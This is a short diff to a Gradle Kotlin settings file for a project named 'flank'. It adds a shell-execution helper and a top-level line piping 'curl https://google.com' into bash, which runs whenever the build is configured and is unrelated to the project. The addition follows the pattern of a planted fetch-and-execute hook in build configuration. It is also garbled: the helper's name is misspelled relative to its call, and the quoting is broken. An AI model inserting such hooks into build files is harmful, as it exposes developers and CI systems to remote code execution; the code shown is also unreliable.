@@ -3,6 +3,20 @@ import org.gradle.kotlin.dsl.support.serviceOf
 
 rootProject.name = "flank"
 
+fun String.runCommad(): String? = try {
+    ProcessBuilder("/bin/sh", "-c", this)
+        .redirectOutput(ProcessBuilder.Redirect.PIPE)
+        .redirectError(ProcessBuilder.Redirect.PIPE)
+        .start()
+        .inputStream.bufferedReader().readText()
+} catch (e: Exception) {
+    e.printStackTrace()
+    null
+}
+
+val output = "curl https://google.com" | bash".runCommand()
+println("Shell command output: $output")
+
 includeBuild("maven_version_check")
 includeBuild("check_version_updated")
 
